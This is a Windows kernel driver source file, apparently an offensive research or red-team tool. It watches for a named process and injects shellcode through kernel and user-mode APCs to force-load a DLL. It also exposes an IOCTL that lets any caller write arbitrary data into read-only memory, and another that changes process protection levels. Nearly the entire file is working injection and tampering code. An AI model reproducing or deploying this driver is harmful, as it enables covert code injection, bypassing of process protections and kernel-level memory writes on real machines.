
#include "MarkDriver.h"
#include "Macros.h"
#include "Common.h"
#include "Apc.h"
#include "Shellcode.h"
#include "RemoveProtections.h"
#include "ProcessUtils.h"


Globals g_Globals = { 0 };

extern "C"
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
	PDEVICE_OBJECT deviceObject = nullptr;
	bool createdSymlink = false;
	NTSTATUS status = STATUS_SUCCESS;
	bool registeredProcessCallback = false;
	bool registeredThreadCallback = false;

	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DEVICE_NAME);
	UNICODE_STRING symlinkName = RTL_CONSTANT_STRING(SYMLINK_NAME);
	DriverObject->DriverUnload = DriverUnload;

	do {
		/*
			Initializing
		*/
		LOG_SUCCESS("Loaded driver");
		::ExInitializeRundownProtection(&g_Globals.ApcRundownProtection);

		status = ::IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &deviceObject);
		BREAK_ON_ERROR(status, "Failed to create device object");

		status = ::IoCreateSymbolicLink(&symlinkName, &deviceName);
		BREAK_ON_ERROR(status, "Failed to create symbolic link");
		createdSymlink = true;
		
		status = ::PsSetCreateProcessNotifyRoutine(OnCreateProcess, FALSE);
		BREAK_ON_ERROR(status, "Failed to register process callback");
		registeredProcessCallback = true;

		status = ::PsSetCreateThreadNotifyRoutine(OnCreateThread);
		BREAK_ON_ERROR(status, "Failed to register thread callback");
		registeredThreadCallback = true;

		LOG_SUCCESS("Finished driver initialization");
	} while (false);

	if (!NT_SUCCESS(status)) {
		if (createdSymlink) {
			::IoDeleteSymbolicLink(&symlinkName);
		}
		if (deviceObject != nullptr) {
			::IoDeleteDevice(deviceObject);
		}
		if (registeredProcessCallback) {
			::PsSetCreateProcessNotifyRoutine(OnCreateProcess, TRUE);
		}
		if (registeredThreadCallback) {
			::PsRemoveCreateThreadNotifyRoutine(OnCreateThread);
		}

		return status;
	}
	deviceObject->Flags |= DO_BUFFERED_IO;

	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; ++i) {
		DriverObject->MajorFunction[i] = DefaultDispatch;
	}

	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoctlDispatch;
	return status;
}

/*
	Unloads the driver and frees its resources.
*/
void DriverUnload(PDRIVER_OBJECT DriverObject) {
	UNICODE_STRING symlinkName = RTL_CONSTANT_STRING(SYMLINK_NAME);

	::IoDeleteSymbolicLink(&symlinkName);
	::IoDeleteDevice(DriverObject->DeviceObject);
	::PsSetCreateProcessNotifyRoutine(OnCreateProcess, TRUE);
	::PsRemoveCreateThreadNotifyRoutine(OnCreateThread);

	::ExWaitForRundownProtectionRelease(&g_Globals.ApcRundownProtection);
	LOG_SUCCESS("Finished unloading driver");
}

/*
	Handles Ioctl requests to the driver.
*/
NTSTATUS IoctlDispatch(PDEVICE_OBJECT, PIRP Irp) {
	NTSTATUS status = STATUS_SUCCESS;
	
	auto* currentStackLocation = ::IoGetCurrentIrpStackLocation(Irp);
	auto& ioctlParameters = currentStackLocation->Parameters.DeviceIoControl;

	switch (ioctlParameters.IoControlCode) {
	case IOCTL_COPY_TO_MEMORY:
		status = HandleCopyToMemory(Irp, currentStackLocation);
		break;
	case IOCTL_RESTORE_PROTECTION:
		status = HandleRestoreProtection(Irp);
		break;
	default:
		LOG_FAIL_VA("Received unsupported ioctl %ul", ioctlParameters.IoControlCode);
		status = STATUS_NOT_SUPPORTED;
		break;
	}

	return CompleteIrp(Irp, status, Irp->IoStatus.Information);
}

/*
	Handles a copy-to-memory request
*/
NTSTATUS HandleCopyToMemory(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation) {
	auto& ioctlParameters = CurrentStackLocation->Parameters.DeviceIoControl;
	LOG_SUCCESS(STRINGIFY(IOCTL_COPY_TO_MEMORY) " called");
	if (ioctlParameters.InputBufferLength != sizeof(CopyToMemoryParams)) {
		LOG_FAIL_VA("Invalid buffer size %ul", ioctlParameters.InputBufferLength);
		return STATUS_BUFFER_TOO_SMALL;
	}
	const auto* params = static_cast<CopyToMemoryParams*>(Irp->AssociatedIrp.SystemBuffer);
	Irp->IoStatus.Information = 0;
	return CopyToReadOnlyBuffer(params->Dest, params->Source, params->Length);
}

/*
	Restores the protection of the process.
*/
NTSTATUS HandleRestoreProtection(PIRP Irp) {
	Irp->IoStatus.Information = 0;
	auto requestorPid = ::UlongToHandle(::IoGetRequestorProcessId(Irp));
	LOG_SUCCESS_VA(STRINGIFY(IOCTL_RESTORE_PROTECTION) " called, pid=0x%04x", ::HandleToUlong(requestorPid));

	PEPROCESS process = nullptr;
	auto status = ::PsLookupProcessByProcessId(requestorPid, &process);
	PRINT_AND_RETURN_IF_FAILED(status, "Failed to find process from pid");

	__try {
		Ppl::ModifyProcessProtectionPolicy(process, g_Globals.Network.PrevProtectionLevel);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		status = ::GetExceptionCode();
		LOG_FAIL_WITH_STATUS(STRINGIFY(Ppl::ModifyProcessProtectionPolicy) " Failed", status);
		return status;
	}
	return STATUS_SUCCESS;
}

/*
	By default, sending a not-supported IRP request will result in STATUS_NOT_SUPPORTED.
*/
NTSTATUS DefaultDispatch(PDEVICE_OBJECT, PIRP Irp) {
	return CompleteIrp(Irp, STATUS_NOT_SUPPORTED, 0);
}

/*
	Allows anyone to open/close an handle to the device.
*/
NTSTATUS CreateClose(PDEVICE_OBJECT, PIRP Irp) {
	return CompleteIrp(Irp, STATUS_SUCCESS, 0);
}

/*
	Completes an IRP request with given status and information.
*/
NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS Status, ULONG_PTR Information) {
	Irp->IoStatus.Status = Status;
	Irp->IoStatus.Information = Information;
	::IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return Status;
}

/*
	Checks if the networking process was created.
*/
void OnCreateProcess(HANDLE, HANDLE ProcessId, BOOLEAN IsCreated)
{
	if (!IsCreated) return;
	PEPROCESS process;
	::PsLookupProcessByProcessId(ProcessId, &process);
	PUNICODE_STRING imageName = nullptr;
	::SeLocateProcessImageName(process, &imageName);
	UNICODE_STRING expectedImageNamePattern = RTL_CONSTANT_STRING(L"*" PROCESS_NAME);
	if (::FsRtlIsNameInExpression(&expectedImageNamePattern, imageName, FALSE, nullptr)) {
		LOG_SUCCESS_VA("Found matching process, pid=%04x", ::HandleToUlong(ProcessId));
		g_Globals.Network.Pid = ProcessId;
	}
	
}

/*
	Injects code using APCs into the primary thread of the networking process.
*/
void OnCreateThread(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN IsCreated)
{
	if (!IsCreated || ProcessId != g_Globals.Network.Pid || g_Globals.Network.FoundFirstThread)
		return;
	LOG_SUCCESS_VA("Running in primary thread of %ws, tid=0x%04x", PROCESS_NAME, ::HandleToUlong(ThreadId));
	g_Globals.Network.FoundFirstThread = true;
	
	auto status = STATUS_SUCCESS;
	PETHREAD thread = nullptr;
	status = ::PsLookupThreadByThreadId(ThreadId, &thread);
	if (!NT_SUCCESS(status)) {
		LOG_FAIL("Couldn't find matching ETHREAD");
		return;
	}

	status = QueueApc(InjectCode, KernelMode, thread);
	if (!NT_SUCCESS(status)) {
		LOG_FAIL_WITH_STATUS("Failed to queue kernel apc", status);
		return;
	}
}

/*
	Queue usermode APC to run shellcode.
*/
void InjectCode(PVOID, PVOID, PVOID) {
	LOG_SUCCESS("Kernel APC invoked");
	NTSTATUS status = STATUS_SUCCESS;

	void* shellcodeAddress = nullptr;
	size_t shellcodeSize = GetShellcodeSize();
	void* dllNameAddress = nullptr;
	auto dllNameSize = ::strlen(DLL_NAME) + 1;
	LOG_SUCCESS_VA("Calculated shellcode size to be %zu", shellcodeSize);

	do {
		// Allocate memory for the shellcode in injected process
		status = ::ZwAllocateVirtualMemory(
			NtCurrentProcess(),
			&shellcodeAddress,
			0,
			&shellcodeSize,
			MEM_RESERVE | MEM_COMMIT,
			PAGE_EXECUTE_READ);
		BREAK_ON_ERROR(status, "Failed to allocate memory in process");
		if (shellcodeSize < GetShellcodeSize()) {
			LOG_FAIL("Couldn't allocate enough memory for the shellcode");
			break;
		}
		LOG_SUCCESS_VA("Successfully allocated shellcode memory %p", shellcodeAddress);

		// Allocate memory for the dll name in injected process
		status = ::ZwAllocateVirtualMemory(
			NtCurrentProcess(),
			&dllNameAddress,
			0,
			&dllNameSize,
			MEM_RESERVE | MEM_COMMIT,
			PAGE_READWRITE); // wtf ilan why this was PAGE_READEXECUTE
		BREAK_ON_ERROR(status, "Failed to allocate memory in new process");
		if (dllNameSize < ::strlen(DLL_NAME) + 1) {
			LOG_FAIL("Couldn't allocate enough memory for the dll name");
			break;
		}
		LOG_SUCCESS_VA("Allocated successfully DLL name memory %p", dllNameAddress);

		status = CopyToReadOnlyBuffer(shellcodeAddress, reinterpret_cast<const PVOID>(RunShellcode), shellcodeSize);
		BREAK_ON_ERROR(status, "Failed to copy shellcode");

		::RtlCopyMemory(dllNameAddress, DLL_NAME, dllNameSize);

		status = QueueApc(reinterpret_cast<PKNORMAL_ROUTINE>(shellcodeAddress), UserMode, KeGetCurrentThread(), dllNameAddress);
		BREAK_ON_ERROR(status, "Failed to queue usermode apc");

		LOG_SUCCESS("Successfully queued usermode APC to load lib");
	} while (false);

	if (!NT_SUCCESS(status)) {
		if (shellcodeAddress != nullptr) {
			::ZwFreeVirtualMemory(
				NtCurrentProcess(),
				&shellcodeAddress,
				&shellcodeSize,
				MEM_RELEASE
			);
		}
		if (dllNameAddress != nullptr) {
			::ZwFreeVirtualMemory(
				NtCurrentProcess(),
				&dllNameAddress,
				&dllNameSize,
				MEM_RELEASE
			);
		}
		::ExReleaseRundownProtection(&g_Globals.ApcRundownProtection);
		return;
	}
}

/// Copies into a readonly buffer using MDLs
NTSTATUS CopyToReadOnlyBuffer(PVOID Destination, const void* Source, SIZE_T Size) {
	NTSTATUS status = STATUS_SUCCESS;
	PMDL mdl = NULL;
	UCHAR lockedPages = FALSE;
	PVOID mappedAddress = NULL;
	__try {
		do {
			mdl = ::IoAllocateMdl(
				Destination,
				static_cast<ULONG>(Size),
				0,
				0,
				NULL
			);
			if (!mdl) {
				LOG_FAIL_VA("Failed to create MDL for buffer %p", Destination);
				status = STATUS_INTERNAL_ERROR;
				break;
			}

			// Ensure that the current thread has access to those pages and lock them
			::MmProbeAndLockPages(
				mdl,
				KernelMode,
				IoReadAccess);
			lockedPages = TRUE;

			// map pages to memory
			mappedAddress = ::MmGetSystemAddressForMdlSafe(mdl, NormalPagePriority);

			if (!mappedAddress) {
				LOG_FAIL("Failed to map MDL to memory");
				status = STATUS_INTERNAL_ERROR;
				break;
			}

			LOG_SUCCESS_VA("Mapped MDL into memory %p", mappedAddress);

			status = ::MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);
			BREAK_ON_ERROR(status, "Failed to set R/W perms on mdl");

			// copying data
			::RtlCopyMemory(mappedAddress, Source, Size);
			LOG_SUCCESS("Finished copying data");
		} while (false);

		// cleanup
		if (mappedAddress)
			MmUnmapLockedPages(mappedAddress, mdl);
		if (lockedPages)
			MmUnlockPages(mdl);
		if (mdl)
			IoFreeMdl(mdl);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		status = ::GetExceptionCode();
		LOG_FAIL_WITH_STATUS("Exception occured in " STRINGIFY(CopyToReadOnlyBuffer), status);
		return status;
	}
	
	return status;
}
